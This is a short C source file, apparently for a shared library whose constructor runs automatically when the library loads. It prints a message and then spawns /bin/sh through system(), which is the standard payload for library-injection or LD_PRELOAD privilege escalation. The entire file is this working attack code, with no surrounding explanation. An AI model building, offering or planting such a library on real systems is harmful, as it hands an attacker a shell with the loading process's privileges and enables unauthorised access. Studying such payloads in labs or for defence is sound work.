#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) call_sh()
{
  printf("DLL function 'call_sh' was called\n");
  system("/bin/sh");
}